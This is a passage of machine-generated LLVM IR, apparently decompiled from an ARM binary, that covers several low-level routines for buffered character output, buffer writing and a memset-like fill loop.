  %v4_e9c8 = trunc i32 %v3_e9c8 to i8
  %v5_e9cc = icmp eq i8 %v4_e9c8, -1
  store i1 %v5_e9cc, i1* %cpsr_c.global-to-local, align 1
  %v10_e9cc = icmp eq i32 %v3_e9c8, -1
  store i1 %v10_e9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_e9cc, label %dec_label_pc_e9d4, label %dec_label_pc_e9f0

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9c8
  %v0_e9d4 = load i32, i32* @r5, align 4
  %v1_e9d4 = inttoptr i32 %v0_e9d4 to i8*
  %v2_e9d4 = load i8, i8* %v1_e9d4, align 1
  %v1_e9d8 = and i8 %v2_e9d4, 8
  %v2_e9d8 = icmp eq i8 %v1_e9d8, 0
  store i1 %v2_e9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9d8, label %dec_label_pc_ea00, label %dec_label_pc_ea10

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9c8
  %v3_e9e4 = load i32, i32* @r4, align 4
  %v4_e9e4 = inttoptr i32 %v3_e9e4 to i8*
  store i8 %v4_e9c8, i8* %v4_e9e4, align 1
  %v0_e9e8 = load i32, i32* @r4, align 4
  %v1_e9e8 = inttoptr i32 %v0_e9e8 to i8*
  %v2_e9e8 = load i8, i8* %v1_e9e8, align 1
  %v5_e9e8 = add i32 %v0_e9e8, 1
  store i32 %v5_e9e8, i32* @r4, align 4
  %v2_e9ec = icmp ugt i8 %v2_e9e8, 9
  store i1 %v2_e9ec, i1* %cpsr_c.global-to-local, align 1
  %v7_e9ec = icmp eq i8 %v2_e9e8, 10
  store i1 %v7_e9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9ec, label %dec_label_pc_ea00, label %dec_label_pc_e9f4.backedge

dec_label_pc_e9f4.backedge:                       ; preds = %dec_label_pc_e9f0, %dec_label_pc_e9b0
  %v0_e9f4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_e9f8.pre = load i32, i32* @r5, align 4
  %v1_e9f4 = add i32 %v0_e9f4.pre, -1
  store i32 %v1_e9f4, i32* %r6.global-to-local, align 4
  %v2_e9f4 = icmp ne i32 %v0_e9f4.pre, 0
  store i1 %v2_e9f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f4 = icmp eq i32 %v0_e9f4.pre, 1
  store i1 %v7_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f4, label %dec_label_pc_ea00, label %dec_label_pc_e9a0

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9f4.preheader, %dec_label_pc_e9f0, %dec_label_pc_e9f4.backedge, %dec_label_pc_e9b0, %dec_label_pc_e9d4
  %v0_ea00 = load i32, i32* @r4, align 4
  %v1_ea00 = load i32, i32* %r7.global-to-local, align 4
  %v3_ea00 = icmp uge i32 %v0_ea00, %v1_ea00
  store i1 %v3_ea00, i1* %cpsr_c.global-to-local, align 1
  %v9_ea00 = icmp eq i32 %v0_ea00, %v1_ea00
  store i1 %v9_ea00, i1* %cpsr_z.global-to-local, align 1
  %v2_ea04 = xor i1 %v9_ea00, true
  %v3_ea04 = and i1 %v3_ea00, %v2_ea04
  br i1 %v3_ea04, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_ea00
  %v7_ea08 = inttoptr i32 %v0_ea00 to i8*
  store i8 0, i8* %v7_ea08, align 1
  %v0_ea0c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_ea0c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_ea00, %bb
  %v1_ea0c = phi i1 [ %v1_ea0c.pre, %bb ], [ %v9_ea00, %dec_label_pc_ea00 ]
  %v0_ea0c = phi i1 [ %v0_ea0c.pre, %bb ], [ %v3_ea00, %dec_label_pc_ea00 ]
  %v2_ea0c = xor i1 %v1_ea0c, true
  %v3_ea0c = and i1 %v0_ea0c, %v2_ea0c
  br i1 %v3_ea0c, label %.dec_label_pc_ea14_crit_edge, label %dec_label_pc_ea10

.dec_label_pc_ea14_crit_edge:                     ; preds = %.thread7
  %v0_ea14.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ea14

dec_label_pc_ea10:                                ; preds = %dec_label_pc_e984, %dec_label_pc_e9d4, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ea14

dec_label_pc_ea14:                                ; preds = %.dec_label_pc_ea14_crit_edge, %dec_label_pc_ea10
  %v0_ea14 = phi i32 [ %v0_ea14.pre, %.dec_label_pc_ea14_crit_edge ], [ 0, %dec_label_pc_ea10 ]
  ret i32 %v0_ea14

; uselistorder directives
  uselistorder i1 %v9_ea00, { 1, 0, 2 }
  uselistorder i32 %v1_ea00, { 1, 0 }
  uselistorder i32 %v0_ea00, { 0, 2, 1 }
  uselistorder i32 %v0_e9f4.pre, { 2, 0, 1 }
  uselistorder i1 %v2_e9d8, { 1, 0 }
  uselistorder i32 %v3_e9a0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_e9f824.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder label %dec_label_pc_ea14, { 1, 0 }
  uselistorder label %dec_label_pc_ea10, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_ea00, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_e9a0, { 1, 0 }
}

define i32 @function_ea1c(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ea1c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp5 = sext i8 %arg1 to i32
  store i32 %tmp5, i32* %r0.global-to-local, align 4
  %stack_var_-13 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_ea1c = load i32, i32* @r4, align 4
  store i32 %v3_ea1c, i32* %stack_var_-12, align 4
  %v6_ea1c = load i32, i32* @r5, align 4
  %v2_ea20 = add i32 %arg2, 16
  %v3_ea20 = inttoptr i32 %v2_ea20 to i32*
  %v4_ea20 = load i32, i32* %v3_ea20, align 4
  store i32 %v4_ea20, i32* %r2.global-to-local, align 4
  %v2_ea24 = add i32 %arg2, 28
  %v3_ea24 = inttoptr i32 %v2_ea24 to i32*
  %v4_ea24 = load i32, i32* %v3_ea24, align 4
  store i32 %v4_ea24, i32* %r3.global-to-local, align 4
  %v3_ea28 = icmp uge i32 %v4_ea20, %v4_ea24
  store i1 %v3_ea28, i1* %cpsr_c.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_ea34 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ea34, i32* @r5, align 4
  br i1 %v3_ea28, label %dec_label_pc_ea4c, label %.thread

.thread:                                          ; preds = %dec_label_pc_ea1c
  %v2_ea38 = urem i32 %v0_ea34, 256
  store i32 %v2_ea38, i32* %r3.global-to-local, align 4
  %v2_ea3c = trunc i32 %v0_ea34 to i8
  %v4_ea3c = inttoptr i32 %v4_ea20 to i8*
  store i8 %v2_ea3c, i8* %v4_ea3c, align 1
  %v5_ea3c = load i32, i32* %r2.global-to-local, align 4
  %v6_ea3c = add i32 %v5_ea3c, 1
  store i32 %v6_ea3c, i32* %r2.global-to-local, align 4
  %v0_ea40.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ea40.pr.pr, label %dec_label_pc_ea4c, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_ea40 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_ea40, i32* %r0.global-to-local, align 4
  store i32 %v6_ea3c, i32* %v3_ea20, align 4
  br label %dec_label_pc_eb18

dec_label_pc_ea4c:                                ; preds = %dec_label_pc_ea1c, %.thread
  %v3_ea4c = load i8, i8* %tmp, align 1
  %v4_ea4c = zext i8 %v3_ea4c to i32
  %v1_ea50 = and i32 %v4_ea4c, 192
  store i32 %v1_ea50, i32* %r3.global-to-local, align 4
  %v2_ea54 = icmp eq i32 %v1_ea50, 192
  store i1 %v2_ea54, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_ea54, label %dec_label_pc_ea70, label %dec_label_pc_ea5c

dec_label_pc_ea5c:                                ; preds = %dec_label_pc_ea4c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_ea64 = call i32 @function_11368(i8* nonnull %tmp, i32 128)
  store i32 %v4_ea64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea68 = icmp eq i32 %v4_ea64, 0
  br i1 %v2_ea68, label %dec_label_pc_ea70, label %dec_label_pc_eb14

dec_label_pc_ea70:                                ; preds = %dec_label_pc_ea5c, %dec_label_pc_ea4c
  %v0_ea70 = load i32, i32* @r4, align 4
  %v1_ea70 = add i32 %v0_ea70, 4
  %v2_ea70 = inttoptr i32 %v1_ea70 to i32*
  %v3_ea70 = load i32, i32* %v2_ea70, align 4
  store i32 %v3_ea70, i32* %r3.global-to-local, align 4
  %v2_ea74 = icmp ugt i32 %v3_ea70, -3
  store i1 %v2_ea74, i1* %cpsr_c.global-to-local, align 1
  %v7_ea74 = icmp eq i32 %v3_ea70, -2
  br i1 %v7_ea74, label %dec_label_pc_eb0c, label %dec_label_pc_ea7c

dec_label_pc_ea7c:                                ; preds = %dec_label_pc_ea70
  %v1_ea7c = add i32 %v0_ea70, 12
  %v2_ea7c = inttoptr i32 %v1_ea7c to i32*
  %v3_ea7c = load i32, i32* %v2_ea7c, align 4
  store i32 %v3_ea7c, i32* %r2.global-to-local, align 4
  %v1_ea80 = add i32 %v0_ea70, 8
  %v2_ea80 = inttoptr i32 %v1_ea80 to i32*
  %v3_ea80 = load i32, i32* %v2_ea80, align 4
  store i32 %v3_ea80, i32* %r3.global-to-local, align 4
  %v3_ea84 = icmp uge i32 %v3_ea7c, %v3_ea80
  store i1 %v3_ea84, i1* %cpsr_c.global-to-local, align 1
  %v9_ea84 = icmp eq i32 %v3_ea7c, %v3_ea80
  br i1 %v9_ea84, label %dec_label_pc_eaf0, label %dec_label_pc_ea8c

dec_label_pc_ea8c:                                ; preds = %dec_label_pc_ea7c
  %v1_ea8c = add i32 %v0_ea70, 16
  %v2_ea8c = inttoptr i32 %v1_ea8c to i32*
  %v3_ea8c = load i32, i32* %v2_ea8c, align 4
  store i32 %v3_ea8c, i32* %r3.global-to-local, align 4
  %v3_ea90 = icmp uge i32 %v3_ea7c, %v3_ea8c
  store i1 %v3_ea90, i1* %cpsr_c.global-to-local, align 1
  %v9_ea90 = icmp eq i32 %v3_ea7c, %v3_ea8c
  br i1 %v9_ea90, label %dec_label_pc_ea98, label %dec_label_pc_eaa8

dec_label_pc_ea98:                                ; preds = %dec_label_pc_ea8c
  store i32 %v0_ea70, i32* @r0, align 4
  %v0_ea9c = call i32 @function_d60c()
  store i32 %v0_ea9c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eaa0 = icmp eq i32 %v0_ea9c, 0
  br i1 %v2_eaa0, label %dec_label_pc_ea98.dec_label_pc_eaa8_crit_edge, label %dec_label_pc_eb14

dec_label_pc_ea98.dec_label_pc_eaa8_crit_edge:    ; preds = %dec_label_pc_ea98
  %v0_eaa8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_eaa8

dec_label_pc_eaa8:                                ; preds = %dec_label_pc_ea98.dec_label_pc_eaa8_crit_edge, %dec_label_pc_ea8c
  %v0_eaa8 = phi i32 [ %v0_eaa8.pre, %dec_label_pc_ea98.dec_label_pc_eaa8_crit_edge ], [ %v0_ea70, %dec_label_pc_ea8c ]
  %v1_eaa8 = add i32 %v0_eaa8, 16
  %v2_eaa8 = inttoptr i32 %v1_eaa8 to i32*
  %v3_eaa8 = load i32, i32* %v2_eaa8, align 4
  store i32 %v3_eaa8, i32* %r2.global-to-local, align 4
  %v0_eaac = load i32, i32* @r5, align 4
  %v1_eaac = urem i32 %v0_eaac, 256
  store i32 %v1_eaac, i32* %r1.global-to-local, align 4
  %v1_eab0 = trunc i32 %v0_eaac to i8
  %v3_eab0 = inttoptr i32 %v3_eaa8 to i8*
  store i8 %v1_eab0, i8* %v3_eab0, align 1
  %v4_eab0 = load i32, i32* %r2.global-to-local, align 4
  %v5_eab0 = add i32 %v4_eab0, 1
  store i32 %v5_eab0, i32* %r2.global-to-local, align 4
  %v0_eab4 = load i32, i32* @r4, align 4
  %v1_eab4 = add i32 %v0_eab4, 1
  %v2_eab4 = inttoptr i32 %v1_eab4 to i8*
  %v3_eab4 = load i8, i8* %v2_eab4, align 1
  %v4_eab4 = zext i8 %v3_eab4 to i32
  store i32 %v4_eab4, i32* %r3.global-to-local, align 4
  %tmp12 = urem i8 %v3_eab4, 2
  %v2_eab8 = icmp eq i8 %tmp12, 0
  %v2_eabc = add i32 %v0_eab4, 16
  %v3_eabc = inttoptr i32 %v2_eabc to i32*
  store i32 %v5_eab0, i32* %v3_eabc, align 4
  br i1 %v2_eab8, label %dec_label_pc_eb0c, label %dec_label_pc_eac4

dec_label_pc_eac4:                                ; preds = %dec_label_pc_eaa8
  %v0_eac4 = load i32, i32* %r1.global-to-local, align 4
  %v2_eac4 = icmp ugt i32 %v0_eac4, 9
  store i1 %v2_eac4, i1* %cpsr_c.global-to-local, align 1
  %v7_eac4 = icmp eq i32 %v0_eac4, 10
  br i1 %v7_eac4, label %dec_label_pc_eacc, label %dec_label_pc_eb0c

dec_label_pc_eacc:                                ; preds = %dec_label_pc_eac4
  %v0_eacc = load i32, i32* @r4, align 4
  store i32 %v0_eacc, i32* @r0, align 4
  %v0_ead0 = call i32 @function_d60c()
  store i32 %v0_ead0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ead4 = icmp eq i32 %v0_ead0, 0
  br i1 %v2_ead4, label %dec_label_pc_eb0c, label %dec_label_pc_eadc

dec_label_pc_eadc:                                ; preds = %dec_label_pc_eacc
  %v0_eadc = load i32, i32* @r4, align 4
  %v1_eadc = add i32 %v0_eadc, 16
  %v2_eadc = inttoptr i32 %v1_eadc to i32*
  %v3_eadc = load i32, i32* %v2_eadc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_eae4 = add i32 %v3_eadc, -1
  store i32 %v1_eae4, i32* %r3.global-to-local, align 4
  store i32 %v1_eae4, i32* %v2_eadc, align 4
  br label %dec_label_pc_eb18

dec_label_pc_eaf0:                                ; preds = %dec_label_pc_ea7c
  %v0_eaf4 = load i32, i32* @r5, align 4
  %v6_eaf4 = trunc i32 %v0_eaf4 to i8
  store i8 %v6_eaf4, i8* %stack_var_-13, align 1
  %v9_eaf4 = ptrtoint i8* %stack_var_-13 to i32
  store i32 %v9_eaf4, i32* %r1.global-to-local, align 4
  %v1_eaf8 = inttoptr i32 %v0_ea70 to i8*
  store i32 %v0_ea70, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_eb00 = call i32 @function_11174(i8* %v1_eaf8, i32 %v9_eaf4, i32 1)
  store i32 %v5_eb00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb04 = icmp eq i32 %v5_eb00, 0
  br i1 %v2_eb04, label %dec_label_pc_eb14, label %dec_label_pc_eb0c

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_eac4, %dec_label_pc_eaf0, %dec_label_pc_eacc, %dec_label_pc_eaa8, %dec_label_pc_ea70
  %v0_eb0c = load i32, i32* @r5, align 4
  %v1_eb0c = urem i32 %v0_eb0c, 256
  store i32 %v1_eb0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb18

dec_label_pc_eb14:                                ; preds = %dec_label_pc_ea98, %dec_label_pc_ea5c, %dec_label_pc_eaf0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb18

dec_label_pc_eb18:                                ; preds = %.thread2, %dec_label_pc_eb0c, %dec_label_pc_eadc, %dec_label_pc_eb14
  %v2_eb1c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_eb1c, i32* @r4, align 4
  store i32 %v6_ea1c, i32* @r5, align 4
  %v11_eb1c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_eb1c

; uselistorder directives
  uselistorder i32 %v0_eac4, { 1, 0 }
  uselistorder i32 %v0_eaac, { 1, 0 }
  uselistorder i32 %v0_ea70, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %v0_ea34, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 2, 3, 12, 4, 5, 6, 7, 11, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_eb18, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_eb14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_eb0c, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_ea4c, { 1, 0 }
}

define i32 @function_eb20(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_eb20:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_eb20 = load i32, i32* @r4, align 4
  store i32 %v3_eb20, i32* %stack_var_-16, align 4
  %v6_eb20 = load i32, i32* @r5, align 4
  %v9_eb20 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_eb2c = call i32 @function_ecc0()
  store i32 %v0_eb2c, i32* @r6, align 4
  %v0_eb34 = load i32, i32* @r5, align 4
  %v0_eb38 = load i32, i32* @r4, align 4
  %v4_eb44 = inttoptr i32 %v0_eb34 to i8*
  %v5_eb44 = call i32 @function_eb54(i32 %v0_eb38, i32 1, i32 %v0_eb2c, i8* %v4_eb44)
  %v1_eb48 = load i32, i32* @r6, align 4
  %v9_eb48 = icmp eq i32 %v5_eb44, %v1_eb48
  br i1 %v9_eb48, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_eb20
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_eb20, %bb
  %v14_eb50 = phi i32 [ %v5_eb44, %dec_label_pc_eb20 ], [ -1, %bb ]
  %v2_eb50 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_eb50, i32* @r4, align 4
  store i32 %v6_eb20, i32* @r5, align 4
  store i32 %v9_eb20, i32* @r6, align 4
  ret i32 %v14_eb50

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_eb54(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
dec_label_pc_eb54:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_eb54 = load i32, i32* @r6, align 4
  %v12_eb54 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_eb5c = load i8, i8* %arg4, align 1
  %v4_eb5c = zext i8 %v3_eb5c to i32
  %v1_eb60 = and i32 %v4_eb5c, 192
  store i32 %v1_eb60, i32* %r3.global-to-local, align 4
  %v2_eb64 = icmp eq i32 %v1_eb60, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_eb64, label %dec_label_pc_eb8c, label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %dec_label_pc_eb54
  %v4_eb80 = call i32 @function_11368(i8* nonnull %arg4, i32 128)
  %v2_eb84 = icmp eq i32 %v4_eb80, 0
  br i1 %v2_eb84, label %dec_label_pc_eb80.dec_label_pc_eb8c_crit_edge, label %dec_label_pc_ebf4

dec_label_pc_eb80.dec_label_pc_eb8c_crit_edge:    ; preds = %dec_label_pc_eb80
  %v0_eb8c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_eb8c

dec_label_pc_eb8c:                                ; preds = %dec_label_pc_eb80.dec_label_pc_eb8c_crit_edge, %dec_label_pc_eb54
  %v0_eb941 = phi i32 [ %v0_eb8c.pre, %dec_label_pc_eb80.dec_label_pc_eb8c_crit_edge ], [ %arg2, %dec_label_pc_eb54 ]
  %v2_eb8c = icmp eq i32 %v0_eb941, 0
  br i1 %v2_eb8c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_eb8c
  br label %dec_label_pc_ebf4

bb:                                               ; preds = %dec_label_pc_eb8c
  %v1_eb90 = load i32, i32* @r6, align 4
  %v3_eb90 = icmp eq i32 %v1_eb90, 0
  store i32 %v0_eb941, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  br i1 %v3_eb90, label %dec_label_pc_ebf4, label %dec_label_pc_eba0

dec_label_pc_eba0:                                ; preds = %bb
  %v0_eba0 = call i32 @function_14a34()
  %v0_eba4 = load i32, i32* @r6, align 4
  %v0_eba8 = load i32, i32* @r4, align 4
  store i32 %v0_eba8, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v0_eba4, %v0_eba0
  br i1 %tmp10, label %dec_label_pc_ebcc, label %dec_label_pc_ebb4

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_eba0
  %v0_ebac = load i32, i32* @r7, align 4
  %v1_ebb4 = load i32, i32* @r5, align 4
  %v2_ebb4 = mul i32 %v1_ebb4, %v0_eba4
  %v4_ebb8 = call i32 @function_11230(i32 %v0_ebac, i32 %v2_ebb4, i32 %v0_eba8)
  store i32 %v4_ebb8, i32* @r0, align 4
  %v0_ebbc = load i32, i32* @r5, align 4
  store i32 %v0_ebbc, i32* @r1, align 4
  %v0_ebc0 = call i32 @function_14a34()
  store i32 %v0_ebc0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ebf8

dec_label_pc_ebcc:                                ; preds = %dec_label_pc_eba0
  %v1_ebcc = inttoptr i32 %v0_eba8 to i32*
  %v2_ebcc = load i32, i32* %v1_ebcc, align 4
  %v1_ebd0 = or i32 %v2_ebcc, 8
  store i32 %v1_ebd0, i32* %r3.global-to-local, align 4
  %v3_ebd4 = sdiv i32 %v2_ebcc, 256
  store i32 %v3_ebd4, i32* %r2.global-to-local, align 4
  %v1_ebd8 = trunc i32 %v3_ebd4 to i8
  %v3_ebd8 = add i32 %v0_eba8, 1
  %v4_ebd8 = inttoptr i32 %v3_ebd8 to i8*
  store i8 %v1_ebd8, i8* %v4_ebd8, align 1
  %v0_ebdc = load i32, i32* %r3.global-to-local, align 4
  %v1_ebdc = trunc i32 %v0_ebdc to i8
  %v2_ebdc = load i32, i32* @r4, align 4
  %v3_ebdc = inttoptr i32 %v2_ebdc to i8*
  store i8 %v1_ebdc, i8* %v3_ebdc, align 1
  %v0_ebe0 = call i32 @function_cc08()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ebec = inttoptr i32 %v0_ebe0 to i32*
  store i32 22, i32* %v2_ebec, align 4
  %v0_ebf8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ebf8

dec_label_pc_ebf4:                                ; preds = %.thread, %dec_label_pc_eb80, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ebf8

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_ebcc, %dec_label_pc_ebb4, %dec_label_pc_ebf4
  %v0_ebf8 = phi i32 [ %v0_ebf8.pre, %dec_label_pc_ebcc ], [ %v0_ebc0, %dec_label_pc_ebb4 ], [ 0, %dec_label_pc_ebf4 ]
  store i32 %v9_eb54, i32* @r6, align 4
  store i32 %v12_eb54, i32* @r7, align 4
  ret i32 %v0_ebf8

; uselistorder directives
  uselistorder i32 %v3_ebd4, { 1, 0 }
  uselistorder i32 %v0_eba4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @function_11230, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_11368, { 1, 0 }
  uselistorder label %dec_label_pc_ebf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ebf4, { 2, 0, 1 }
}

define i32 @function_ec00(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ec00:
  %v2_ec0c = inttoptr i32 %arg2 to i8*
  %v3_ec0c = call i32 @function_11f90(i8* %v2_ec0c, i32 %arg1)
  ret i32 %v3_ec0c
}

define i32 @function_ec10() local_unnamed_addr {
dec_label_pc_ec10:
  %v0_ec10 = load i32, i32* @r0, align 4
  %v1_ec10 = load i32, i32* @r1, align 4
  %v2_ec10 = inttoptr i32 %v0_ec10 to i8*
  %v3_ec10 = call i32 @function_11f90(i8* %v2_ec10, i32 %v1_ec10)
  ret i32 %v3_ec10
}

define i32 @function_ec20(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ec20:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_ec24 = load i32, i32* @r2, align 4
  %v8_ec24 = icmp eq i32 %v0_ec24, 8
  store i1 %v8_ec24, i1* %cpsr_z.global-to-local, align 1
  %v5_ec28 = icmp slt i32 %v0_ec24, 8
  br i1 %v5_ec28, label %dec_label_pc_ec88, label %dec_label_pc_ec2c

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_ec20
  %v4_ec2c = mul i32 %arg2, 256
  %v5_ec2c = or i32 %v4_ec2c, %arg2
  %v4_ec30 = mul i32 %v5_ec2c, 65536
  %v5_ec30 = or i32 %v4_ec30, %v5_ec2c
  store i32 %v5_ec30, i32* %r1.global-to-local, align 4
  %v1_ec3457 = urem i32 %tmp, 4
  %v2_ec3458 = icmp eq i32 %v1_ec3457, 0
  store i1 %v2_ec3458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_ec3458, label %dec_label_pc_ec44, label %bb

bb:                                               ; preds = %dec_label_pc_ec2c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_ec2c ]
  %v3_ec3859 = phi i32 [ %v6_ec38, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_ec2c ]
  %v4_ec38 = inttoptr i32 %v3_ec3859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_ec38, align 1
  %v5_ec38 = load i32, i32* %r3.global-to-local, align 4
  %v6_ec38 = add i32 %v5_ec38, 1
  store i32 %v6_ec38, i32* %r3.global-to-local, align 4
  %v0_ec3c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_ec48.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_ec3c.pr, label %dec_label_pc_ec44, label %.thread

.thread:                                          ; preds = %bb
  %v2_ec3c = add i32 %v0_ec48.pr.pre, -1
  store i32 %v2_ec3c, i32* @r2, align 4
  %v1_ec34 = urem i32 %v6_ec38, 4
  %v2_ec34 = icmp eq i32 %v1_ec34, 0
  store i1 %v2_ec34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec34, label %dec_label_pc_ec44, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_ec38.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_ec38.pre to i8
  br label %bb

dec_label_pc_ec44:                                ; preds = %.thread, %bb, %dec_label_pc_ec2c
  %v0_ec5028 = phi i32 [ %tmp, %dec_label_pc_ec2c ], [ %v6_ec38, %bb ], [ %v6_ec38, %.thread ]
  %v0_ec48.pr = phi i32 [ %v0_ec24, %dec_label_pc_ec2c ], [ %v0_ec48.pr.pre, %bb ], [ %v2_ec3c, %.thread ]
  %v0_ec44 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_ec44, i32* @ip, align 4
  %v8_ec4810 = icmp eq i32 %v0_ec48.pr, 8
  store i1 %v8_ec4810, i1* %cpsr_z.global-to-local, align 1
  %v5_ec4c11 = icmp slt i32 %v0_ec48.pr, 8
  br i1 %v5_ec4c11, label %dec_label_pc_ec88, label %dec_label_pc_ec50.preheader

dec_label_pc_ec50.preheader:                      ; preds = %dec_label_pc_ec44
  %v1_ec5046 = inttoptr i32 %v0_ec5028 to i32*
  store i32 %v0_ec44, i32* %v1_ec5046, align 4
  %v3_ec5047 = add i32 %v0_ec5028, 4
  %v4_ec5048 = inttoptr i32 %v3_ec5047 to i32*
  %v5_ec5049 = load i32, i32* @ip, align 4
  store i32 %v5_ec5049, i32* %v4_ec5048, align 4
  %v6_ec5050 = add i32 %v0_ec5028, 8
